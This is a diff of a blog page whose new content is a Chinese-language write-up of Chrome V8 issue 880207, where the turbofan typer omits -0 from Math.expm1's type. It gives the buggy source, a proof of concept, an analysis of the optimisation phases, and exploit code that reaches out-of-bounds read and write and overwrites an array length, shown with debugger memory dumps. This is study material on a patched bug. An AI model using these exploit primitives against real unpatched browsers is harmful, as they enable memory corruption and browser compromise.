@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2022 | ruan</title>
+  <title>chrome issue 880207 | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/archives/2022/index.html">
+  <meta name="description" content="Math.expm1的一个issue">
+<meta property="og:type" content="article">
+<meta property="og:title" content="chrome issue 880207">
+<meta property="og:url" content="http://yoursite.com/2022/03/21/Chrome-Math_expm1-issue880207/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="Math.expm1的一个issue">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/img/mathexpm1/typer1.png">
+<meta property="og:image" content="http://yoursite.com/img/mathexpm1/typerlowering1.png">
+<meta property="og:image" content="http://yoursite.com/img/mathexpm1/looppeeling1.png">
+<meta property="og:image" content="http://yoursite.com/img/mathexpm1/loadelimination1.png">
+<meta property="article:published_time" content="2022-03-21T09:21:45.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:03:24.234Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/mathexpm1/typer1.png">
   
     <link rel="alternative" href="/atom.xml" title="ruan" type="application/atom+xml">
   
@@ -136,211 +145,207 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-Chrome-Math_expm1-issue880207" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      chrome issue 880207
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/21/Chrome-Math_expm1-issue880207/" class="archive-article-date">
+
+        
+        <a href="/2022/03/21/Chrome-Math_expm1-issue880207/" class="archive-article-date">
   	<time datetime="2022-03-21T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/21/Chrome-Math_expm1-issue880207/">chrome issue 880207</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Math.expm1的一个issue</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>漏洞issue：<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=880207">https://bugs.chromium.org/p/chromium/issues/detail?id=880207</a></p>
+<p>Ubuntu20.04LTS x64</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout 7.0.290</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
-          
+<p>为了能消除checkbounds节点，还需要在args.gn里加一句<code>v8_untrusted_code_mitigations = false</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> cat args.gn</span>                   </span><br><span class="line">is_debug = true</span><br><span class="line">target_cpu = &quot;x64&quot;</span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_slow_dchecks = false</span><br><span class="line">v8_optimized_debug = false</span><br><span class="line">v8_untrusted_code_mitigations = false</span><br></pre></td></tr></table></figure>
 
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/compiler/typer.cc</span></span><br><span class="line">Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!fun.<span class="built_in">IsHeapConstant</span>() || !fun.<span class="built_in">AsHeapConstant</span>()-&gt;<span class="built_in">Ref</span>().<span class="built_in">IsJSFunction</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">NonInternal</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  JSFunctionRef function = fun.<span class="built_in">AsHeapConstant</span>()-&gt;<span class="built_in">Ref</span>().<span class="built_in">AsJSFunction</span>();</span><br><span class="line">  <span class="keyword">if</span> (!function.<span class="built_in">shared</span>().<span class="built_in">HasBuiltinFunctionId</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">NonInternal</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in"><span class="keyword">switch</span></span> (function.<span class="built_in">shared</span>().<span class="built_in">builtin_function_id</span>()) &#123;</span><br><span class="line">    <span class="comment">// ............................ //</span></span><br><span class="line">    <span class="comment">// Unary math functions.</span></span><br><span class="line">    <span class="keyword">case</span> BuiltinFunctionId::kMathAbs:</span><br><span class="line">    <span class="keyword">case</span> BuiltinFunctionId::kMathExp:</span><br><span class="line">    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">      <span class="keyword">return</span> Type::<span class="built_in">Union</span>(Type::<span class="built_in">PlainNumber</span>(), Type::<span class="built_in">NaN</span>(), t-&gt;<span class="built_in">zone</span>());			<span class="comment">// [1]</span></span><br><span class="line">	<span class="comment">// ............................. //</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数是在turbofan的typer阶段对JSCall节点进行类型推断的时候调用的，可以看到如果调用的函数是MathExpm1，它将推断该JSCall的type为<code>Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());</code>，也就是说是 <code>Type::PlainNumber() U Type::NaN()</code>。从以下定义：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERNAL_BITSET_TYPE_LIST(V)                                      \</span></span><br><span class="line">  <span class="comment">// ....  //</span></span><br><span class="line">  <span class="built_in">V</span>(OtherNumber,     <span class="number">1u</span> &lt;&lt; <span class="number">4</span>)  \</span><br><span class="line">  <span class="comment">// .... //</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROPER_BITSET_TYPE_LIST(V) \</span></span><br><span class="line">  <span class="built_in">V</span>(None,                     <span class="number">0u</span>)        \</span><br><span class="line">  <span class="comment">// ........................ //</span></span><br><span class="line">  <span class="built_in">V</span>(MinusZero,                <span class="number">1u</span> &lt;&lt; <span class="number">11</span>)  \</span><br><span class="line">  <span class="built_in">V</span>(NaN,                      <span class="number">1u</span> &lt;&lt; <span class="number">12</span>)  \</span><br><span class="line">  <span class="comment">// ....................... // </span></span><br><span class="line">  <span class="built_in">V</span>(PlainNumber,                  kIntegral32 | kOtherNumber) \</span><br><span class="line">  <span class="comment">// ..................... //</span></span><br><span class="line">  <span class="built_in">V</span>(MinusZeroOrNaN,               kMinusZero | kNaN) \</span><br><span class="line">  <span class="comment">// ....................  //</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出-0，NaN都是比较特别的，而 <code>Type::PlainNumber() U Type::NaN()</code>并为包含-0，但是MathExpm1实际在运行的时候的的确确会返回-0：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">V8 version <span class="number">7.0</span><span class="number">.290</span></span><br><span class="line">d8&gt; Object.<span class="built_in">is</span>(Math.<span class="built_in">expm1</span>(<span class="number">-0</span>),<span class="number">-0</span>);</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">d8&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这导致turbofan对Math.expm1的返回类型判读出错，而该出错会继续影响到后续的优化阶段</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(-<span class="number">0</span>), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo());</span><br></pre></td></tr></table></figure>
+
+<p>存在漏洞的版本会输出：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>在优化后，返回了错误的结果</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>根据<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=762874">https://bugs.chromium.org/p/chromium/issues/detail?id=762874</a> issue里的手法，就是利用turbofan对数组范围的预测错误从而消除checkbounds节点来造成越界读写，比如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.3</span>];   <span class="comment">// a.length = 3</span></span><br><span class="line">    <span class="keyword">var</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(-<span class="number">0</span>), -<span class="number">0</span>); <span class="comment">// turbofan : false , really true</span></span><br><span class="line">    										<span class="comment">// turbofan : range(0,0) , really range(1,1)</span></span><br><span class="line">    <span class="keyword">return</span> a[idx * <span class="number">1337</span>];	<span class="comment">// turbofan 认为idx*1337为0，小于数组a的长度，所以不需要checkbounds节点，</span></span><br><span class="line">    						<span class="comment">// 而实际运行时该值会是1337，从而导致越界读</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概就是这么个意思</p>
+<p>回到漏洞，在turbofan执行的过程中，有3个阶段都会对节点的类型进行推断，分别是typer，load elimination和simplified lowering这3个阶段，而且两个阶段还会进行常量折叠，如果在前两个阶段Object.is的结果被标记为false，那Object.is节点就会被简单的替换成一个false的常量节点，这样就无法进行后续的利用，这点可以在turbolizer中看到：</p>
+<p><img src="/img/mathexpm1/typer1.png"></p>
+<p>Object.is这里是一个SameValue节点，在该阶段后，其就被换成了一个false的常量：</p>
+<p><img src="/img/mathexpm1/typerlowering1.png"></p>
+<p>而为了在simplified lowering阶段消除checkbounds节点，我们应该要使其在前两个阶段（typer和load elimination）不被常量折叠，这时候就要依靠load elimination和simplified lowering两个阶段间的escape analysis阶段，该阶段简单来说就是分析该函数里的对象有没有逃逸（我的理解是没有逃出该函数的作用域），这样就不需要在堆中分配该对象，直接使用栈或者寄存器（这样会更高效），以下是一个简单的例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;<span class="attr">x</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> o.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会被替换成：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o_x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> o_x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们把-0藏在一个对象中，修改后的poc：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">mz</span>: -<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), o.mz);</span><br><span class="line">    <span class="keyword">return</span> a[b * <span class="number">1337</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">30000</span>;i++)</span><br><span class="line">    foo(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行后会输出一个不是0.1的浮点数，foo也不会因为out-of-bound而被deopt</p>
+<h4 id="foo-“0”"><a href="#foo-“0”" class="headerlink" title="foo(“0”)"></a>foo(“0”)</h4><p>这里有个细节就是我们用的是foo(“0”);来触发优化，而不是foo(-0)，这样做的原因是，如果只是foo(-0)或者foo(0)，就是纯数字的话，Math.expm1会变成NumberExpm1节点而不是JSCall了，而SameValue会在loadelimination阶段后变成false节点：</p>
+<p><img src="/img/mathexpm1/looppeeling1.png"></p>
+<p>load elimination阶段：</p>
+<p><img src="/img/mathexpm1/loadelimination1.png"></p>
+<p>这导致后续漏洞无法利用了，因为false节点会变成0；该替换是发生在loadelimination阶段的ConstantFoldingReducer里</p>
+<p>经过调试发现，在loadelimination阶段的TypeNarrowingReducer里，samevalue节点的输入1，也就是LoadField类型被推断为-0而不是Number，导致后面samevalue直接被替换为false，因为<code>Type::PlainNumber() U Type::NaN()</code>不包含-0；</p>
+<p>而在换成了foo(“0”)之后，turbofan其实编译了两遍foo函数，第一次生成的也是NumberExpm1节点，但是由于我们是传入的参数为“0”，是一个字符串，所以第一次被优化的foo函数会被deopt，第二次turbofan编译foo函数的时候，它知道了参数不一定是Number，所以生成的就是JSCall节点（builtin的Math.exmp1函数可以接受任意类型的参数）</p>
+<p>但是还有个疑问就是不知道为啥在第二次编译foo后，与samevalue节点相连的LoadField节点在TypeNarrowingReducer类型就被推断为Number了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>前面我们可以越界读了，同理我们也可以越界写：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> b = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> c = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">mz</span>: -<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), o.mz);</span><br><span class="line">    a[idx*<span class="number">13</span>] = <span class="number">8.691694759794e-311</span>; <span class="comment">// 0x1000 &lt;&lt; 32 as double</span></span><br><span class="line">    oob_arr = b;</span><br><span class="line">    target_buffer = c;</span><br><span class="line">    <span class="keyword">return</span> idx*<span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(size);</span><br><span class="line">        <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_arr;</span><br><span class="line"><span class="keyword">var</span> target_buffer;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">30000</span>;i++)</span><br><span class="line">    foo(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = foo(-<span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);</span><br><span class="line"></span><br><span class="line">%DebugPrint(oob_arr);</span><br><span class="line">%DebugPrint(target_buffer);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+
+<p>gdb中：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4096</span></span><br><span class="line"><span class="number">0x1f707ef1f741</span> &lt;JSArray[<span class="number">4096</span>]&gt;</span><br><span class="line"><span class="number">0x1f707ef1f761</span> &lt;ArrayBuffer map = <span class="number">0x3094f388c7f1</span>&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1f707ef1f740</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1f707ef1f740</span> —▸ <span class="number">0x3094f3882931</span> ◂— <span class="number">0x4000011a3776822</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1f707ef1f748</span> —▸ <span class="number">0x11a377682d29</span> ◂— <span class="number">0x11a3776828</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1f707ef1f750</span> —▸ <span class="number">0x1f707ef1f711</span> ◂— <span class="number">0x11a3776835</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1f707ef1f758</span> ◂— <span class="number">0x100000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1f707ef1f760</span> —▸ <span class="number">0x3094f388c7f1</span> ◂— <span class="number">0x9000011a3776822</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1f707ef1f768</span> —▸ <span class="number">0x11a377682d29</span> ◂— <span class="number">0x11a3776828</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1f707ef1f770</span> —▸ <span class="number">0x11a377682d29</span> ◂— <span class="number">0x11a3776828</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1f707ef1f778</span> ◂— <span class="number">0x300000000000</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x1f707ef1f780</span> —▸ <span class="number">0x55a56e4601a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x1f707ef1f788</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x1f707ef1f790</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x1f707ef1f798</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x1f707ef1f7a0</span> ◂— <span class="number">0xb33f00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>oob_arr的element就在它自己的低地址处，ArrayBuffer和oob_arr相邻，长度也被我们改为了0x1000</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=880207">https://bugs.chromium.org/p/chromium/issues/detail?id=880207</a></p>
+<p><a target="_blank" rel="noopener" href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2022/03/21/Chrome-Math_expm1-issue880207/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/09/debug_v8_bytecode/" class="archive-article-date">
-  	<time datetime="2022-03-09T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/09/debug_v8_bytecode/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">调试v8 bytecode</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/09/debug_v8_bytecode/">调试v8 bytecode</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">2.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">2.2.</span> <span class="toc-text">exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#foo-%E2%80%9C0%E2%80%9D"><span class="toc-number">2.2.1.</span> <span class="toc-text">foo(“0”)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/26/pwn2winctf2020-OmniTmizer_new/" class="archive-article-date">
-  	<time datetime="2022-01-26T04:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-26</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/26/pwn2winctf2020-OmniTmizer_new/">pwn2win CTF OmniTmizer</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/21/chrome-cve-2020-16040%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-01-21T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/21/chrome-cve-2020-16040%E5%88%86%E6%9E%90/">chrome cve-2020-16040 分析</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
